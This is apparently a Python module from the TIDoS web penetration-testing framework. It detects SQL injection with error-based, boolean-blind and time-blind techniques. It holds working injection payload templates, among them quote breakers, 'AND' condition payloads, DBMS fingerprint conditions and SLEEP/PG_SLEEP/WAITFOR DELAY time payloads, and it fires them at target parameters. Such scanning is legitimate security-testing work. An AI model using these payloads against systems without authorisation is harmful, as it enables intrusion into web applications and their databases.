#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""
SQL injection detection engine (used by modules/VlnAnalysis/Severe/sqli.py).

Three techniques, each built on differential evidence so that scary-looking
pages, echoing pages and pages with random content are not reported:

  error    a quote-breaking suffix makes a DBMS error message appear that is
           absent from the baseline page; the error reproduces, and the
           balanced variant of the payload ('' instead of ') does not error
           ("confirmed") -- in numeric contexts the balanced variant is a
           syntax error too, so such findings are labelled "likely".
  boolean  `AND <true>` keeps the page identical to the baseline while
           `AND <false>` changes it, by a margin larger than the page's own
           request-to-request jitter; repeated with fresh random operands,
           and the two false pages must agree with each other.
  time     a sleep payload delays the response beyond the slowest baseline
           request, the same payload with a zero delay does not, and a
           second, longer delay delays it again (scales with the delay).

Each technique reports a DBMS guess (error signature, boolean fingerprint
functions, or the sleep function that worked).
"""

from __future__ import annotations

import html
import random
import re
import string
import time
from urllib.parse import quote, quote_plus

from core.methods import inject

TECHNIQUES = ("error", "boolean", "time")

# --------------------------------------------------------------------------
# error-based
# --------------------------------------------------------------------------

# (dbms, regex) -- matched case-insensitively against response bodies
ERROR_SIGNATURES = [
    ("MySQL", r"You have an error in your SQL syntax"),
    ("MySQL", r"check the manual that (?:corresponds|fits) to your (?:MySQL|MariaDB)"),
    ("MySQL", r"Warning:\s*(?:</b>\s*)?mysqli?_\w+\("),
    ("MySQL", r"supplied argument is not a valid MySQL"),
    ("MySQL", r"MySQLSyntaxErrorException|com\.mysql\.(?:cj\.)?jdbc"),
    ("MySQL", r"MySqlClient\.|MySqlException"),
    ("MySQL", r"Unknown column '[^']{1,100}' in '(?:where|field list|order) clause'"),
    ("MySQL", r"SQLSTATE\[42000\]: Syntax error or access violation: 1064"),
    ("MariaDB", r"MariaDB server version for the right syntax"),
    ("PostgreSQL", r"PostgreSQL.{0,40}ERROR"),
    ("PostgreSQL", r"Warning:\s*(?:</b>\s*)?pg_\w+\("),
    ("PostgreSQL", r"valid PostgreSQL result"),
    ("PostgreSQL", r"Npgsql\.|PG::SyntaxError|org\.postgresql\.util\.PSQLException"),
    ("PostgreSQL", r"ERROR:\s+(?:syntax error at or near|unterminated quoted string at or near)"),
    ("PostgreSQL", r"psycopg2?\.(?:errors\.)?\w*(?:Error|SyntaxError)"),
    ("Microsoft SQL Server", r"Unclosed quotation mark (?:after|before) the character string"),
    ("Microsoft SQL Server", r"Incorrect syntax near\b"),
    ("Microsoft SQL Server", r"(?:OLE DB|ODBC).{0,40}SQL Server|SQL Server.{0,40}(?:Driver|Native Client)"),
    ("Microsoft SQL Server", r"System\.Data\.SqlClient\.SqlException|Microsoft\.Data\.SqlClient"),
    ("Microsoft SQL Server", r"com\.microsoft\.sqlserver\.jdbc|Warning:\s*(?:</b>\s*)?(?:mssql|sqlsrv)_\w+\("),
    ("Oracle", r"\bORA-0(?:0933|0921|1756|0936|1740|0907|1722)\b"),
    ("Oracle", r"\bORA-\d{5}:"),
    ("Oracle", r"quoted string not properly terminated"),
    ("Oracle", r"oracle\.jdbc|Warning:\s*(?:</b>\s*)?oci_\w+\("),
    ("SQLite", r"SQLite[/.]JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException"),
    ("SQLite", r"Warning:\s*(?:</b>\s*)?(?:sqlite_\w+|SQLite3::\w+)\("),
    ("SQLite", r"\[SQLITE_ERROR\]|SQLITE_ERROR|sqlite3\.OperationalError"),
    ("SQLite", r"unrecognized token: \"[^\"]{0,100}'"),
    ("IBM DB2", r"CLI Driver.{0,40}DB2|DB2 SQL error|\bSQLCODE=-\d+"),
    ("IBM DB2", r"Warning:\s*(?:</b>\s*)?db2_\w+\("),
    ("Microsoft Access", r"Microsoft Access (?:\d+ )?Driver|JET Database Engine|Access Database Engine"),
    ("Microsoft Access", r"Syntax error (?:\(missing operator\) )?in query expression"),
    ("Sybase", r"Sybase message|Sybase.{0,40}Server message|SybSQLException"),
    ("Informix", r"Exception.{0,40}Informix|Informix ODBC Driver"),
    ("Firebird", r"Dynamic SQL Error|Warning:\s*(?:</b>\s*)?ibase_\w+\("),
    ("H2", r"org\.h2\.jdbc\.JdbcSQL"),
    ("HSQLDB", r"org\.hsqldb\.jdbc|Unexpected end of command in statement \["),
    ("Generic", r"\bSQL syntax error\b|syntax error at or near|unterminated (?:quoted )?string"),
    ("Generic (PDO)", r"PDOException|SQLSTATE\[\w{5}\]"),
]
_COMPILED = [(dbms, re.compile(rx, re.I)) for dbms, rx in ERROR_SIGNATURES]

# quote-breaking suffix -> balanced control that is valid SQL in the same context
BREAKERS = [("'", "''"), ('"', '""'), ("\\", "\\\\")]


def sql_errors(body: str) -> dict[int, str]:
    """Signature index -> matched text for every DBMS error in `body`."""
    out = {}
    for i, (_, rx) in enumerate(_COMPILED):
        m = rx.search(body)
        if m:
            out[i] = m.group(0)[:120]
    return out


def _dbms_of(indexes) -> str:
    names = [_COMPILED[i][0] for i in sorted(indexes)]
    specific = [n for n in names if not n.startswith("Generic")]
    return (specific or names or ["unknown"])[0]


def check_error(session, point, baseline: str):
    base = set(sql_errors(baseline))
    for brk, balanced in BREAKERS:
        r1 = inject.text(point.send(session, brk, append=True))
        new = {i: m for i, m in sql_errors(r1).items() if i not in base}
        if not new:
            continue
        # reproducible, with a different (harmless) prefix in front of the breaker
        r2 = inject.text(point.send(session, inject.marker(4) + brk, append=True))
        again = {i for i in sql_errors(r2) if i not in base}
        if not again & set(new):
            continue
        ctrl = {i for i in sql_errors(inject.text(point.send(session, balanced, append=True)))
                if i not in base}
        dbms = _dbms_of(new)
        sample = next(iter(new.values()))
        if ctrl & set(new):
            # balanced payload errors too: numeric context (1'' is invalid SQL as well)
            # or a page that errors on any odd input -- only "likely"
            conf = "likely"
            why = f"DBMS error '{sample}' appears with {brk!r} (not in baseline); balanced {balanced!r} also errors"
        else:
            conf = "confirmed"
            why = f"DBMS error '{sample}' appears with {brk!r}, not in baseline nor with balanced {balanced!r}"
        return inject.Finding(point, brk, f"[{conf}] DBMS: {dbms}; {why}", "SQLi (error-based)",
                              {"dbms": dbms, "confidence": conf})
    return None


# --------------------------------------------------------------------------
# boolean-based blind
# --------------------------------------------------------------------------

# {c} = condition; {z} = random filler to re-balance the trailing quote
BOOLEAN_TEMPLATES = [
    " AND {c}",
    "' AND {c} AND '{z}'='{z}",
    '" AND {c} AND "{z}"="{z}',
    ") AND {c} AND ({n}={n}",
    "') AND {c} AND ('{z}'='{z}",
    " AND {c}-- -",
    "' AND {c}-- -",
    '" AND {c}-- -',
]

# conditions that are only valid (and true) on one DBMS
FINGERPRINTS = [
    ("MySQL", "CONNECTION_ID()=CONNECTION_ID()"),
    ("PostgreSQL", "PG_BACKEND_PID()=PG_BACKEND_PID()"),
    ("Microsoft SQL Server", "@@PACK_RECEIVED=@@PACK_RECEIVED"),
    ("Oracle", "ROWNUM=ROWNUM"),
    ("SQLite", "SQLITE_VERSION()=SQLITE_VERSION()"),
]


def _rand_int() -> int:
    return random.randint(1000, 9999)


def _fill(template: str, cond: str) -> str:
    z = "".join(random.choices(string.ascii_letters, k=4))
    return template.format(c=cond, z=z, n=_rand_int())


def _strip(body: str, value: str) -> str:
    """Remove reflections of the injected value so echo pages compare equal."""
    if not value:
        return body
    for v in {value, html.escape(value), html.escape(value, quote=False),
              quote(value), quote_plus(value)}:
        body = body.replace(v, "")
    return body


class _Fetcher:
    def __init__(self, session, point):
        self.session, self.point = session, point

    def __call__(self, value: str) -> str:
        r = self.point.send(self.session, value, append=True)
        body = inject.text(r)
        return _strip(body, self.point.original + value) if value else body


def check_boolean(session, point, baseline: str, baseline2: str):
    fetch = _Fetcher(session, point)
    stability = inject.ratio(baseline, baseline2)
    if stability < 0.90:
        return None  # page changes too much between identical requests
    # the false page must differ from the baseline by more than the jitter
    margin = max(0.03, (1 - stability) * 3)

    def pair(template):
        a, b = _rand_int(), _rand_int()
        while b == a:
            b = _rand_int()
        t_payload = _fill(template, f"{a}={a}")
        t = fetch(t_payload)
        f = fetch(_fill(template, f"{a}={b}"))
        rt, rf = inject.ratio(t, baseline), inject.ratio(f, baseline)
        ok = bool(t) and rt >= stability - 0.02 and rf <= rt - margin
        return ok, t_payload, f, rt, rf

    for template in BOOLEAN_TEMPLATES:
        ok, payload, f1, rt, rf = pair(template)
        if not ok:
            continue
        ok2, _, f2, _, _ = pair(template)
        if not ok2 or inject.ratio(f1, f2) < stability - 0.05:
            continue
        # sanity: the baseline still looks like the baseline (page didn't just change)
        again = fetch("")
        if inject.ratio(again, baseline) < stability - 0.02:
            continue
        dbms = "unknown"
        for name, cond in FINGERPRINTS:
            t = fetch(_fill(template, cond))
            if inject.ratio(t, baseline) >= stability - 0.02:
                dbms = name
                break
        why = (f"true condition matches baseline ({rt:.2f}), false differs ({rf:.2f}); "
               f"page jitter {1 - stability:.2f}; reproduced with new operands")
        return inject.Finding(point, payload, f"[confirmed] DBMS: {dbms}; {why}",
                              "SQLi (boolean-blind)", {"dbms": dbms, "confidence": "confirmed"})
    return None


# --------------------------------------------------------------------------
# time-based blind
# --------------------------------------------------------------------------

# {d} = delay in seconds, {r} = random int, {z} = random letters
TIME_PAYLOADS = [
    ("MySQL", " AND SLEEP({d})"),
    ("MySQL", "' AND SLEEP({d}) AND '{z}'='{z}"),
    ("MySQL", '" AND SLEEP({d}) AND "{z}"="{z}'),
    ("MySQL", "' AND SLEEP({d})-- -"),
    ("MySQL", " AND (SELECT {r} FROM (SELECT(SLEEP({d})))x)"),
    ("PostgreSQL", " AND {r}=(SELECT {r} FROM PG_SLEEP({d}))"),
    ("PostgreSQL", "' AND {r}=(SELECT {r} FROM PG_SLEEP({d}))-- -"),
    ("PostgreSQL", ";SELECT PG_SLEEP({d})-- -"),
    ("Microsoft SQL Server", " WAITFOR DELAY '0:0:{d}'-- -"),
    ("Microsoft SQL Server", "' WAITFOR DELAY '0:0:{d}'-- -"),
    ("Microsoft SQL Server", ";WAITFOR DELAY '0:0:{d}'-- -"),
    ("Oracle", " AND {r}=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{d})"),
    ("Oracle", "' AND {r}=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{d})-- -"),
]


def _timed(session, point, value: str, timeout: float) -> float:
    start = time.monotonic()
    r = point.send(session, value, append=True, timeout=timeout)
    took = time.monotonic() - start
    if r is None and took < timeout * 0.9:
        return -1.0  # network error, not a delay
    return took


def check_time(session, point, delay: float):
    d1 = max(1, int(round(delay)))
    d2 = d1 * 2
    base = [_timed(session, point, "", 30) for _ in range(3)]
    if min(base) < 0:
        return None
    slow = max(base)
    timeout = slow + d2 + 10
    for dbms, tpl in TIME_PAYLOADS:
        r, z = _rand_int(), "".join(random.choices(string.ascii_letters, k=4))
        make = lambda d: tpl.format(d=d, r=r, z=z)  # noqa: E731
        t1 = _timed(session, point, make(d1), timeout)
        if t1 < slow + d1 * 0.8:
            continue
        t0 = _timed(session, point, make(0), timeout)
        if t0 < 0 or t0 >= slow + d1 * 0.5:
            continue  # zero delay is slow too: not our sleep
        t2 = _timed(session, point, make(d2), timeout)
        if t2 < slow + d2 * 0.8:
            continue
        why = (f"baseline max {slow:.2f}s; SLEEP {d1}s -> {t1:.2f}s, 0s -> {t0:.2f}s, "
               f"{d2}s -> {t2:.2f}s")
        return inject.Finding(point, make(d1), f"[confirmed] DBMS: {dbms}; {why}",
                              "SQLi (time-blind)", {"dbms": dbms, "confidence": "confirmed"})
    return None


# --------------------------------------------------------------------------
# driver
# --------------------------------------------------------------------------

def parse_techniques(value: str) -> list[str]:
    """'all' | comma/space separated subset of TECHNIQUES ('' -> error,boolean)."""
    words = [w for w in re.split(r"[\s,;+]+", value.lower()) if w]
    if not words:
        return ["error", "boolean"]
    if "all" in words:
        return list(TECHNIQUES)
    alias = {"err": "error", "bool": "boolean", "blind": "boolean", "sleep": "time", "timing": "time"}
    out = []
    for w in words:
        w = alias.get(w, w)
        if w in TECHNIQUES and w not in out:
            out.append(w)
    return out


def make_check(session, techniques: list[str], delay: float):
    """check(point) for inject.scan: every enabled technique, one finding each."""
    def check(point):
        b1 = point.send(session, "", append=True)
        if b1 is None:
            return []
        fetch = _Fetcher(session, point)
        baseline = inject.text(b1)
        findings = []
        if "error" in techniques:
            f = check_error(session, point, baseline)
            if f:
                findings.append(f)
        if "boolean" in techniques:
            f = check_boolean(session, point, baseline, fetch(""))
            if f:
                findings.append(f)
        if "time" in techniques:
            f = check_time(session, point, delay)
            if f:
                findings.append(f)
        return findings
    return check
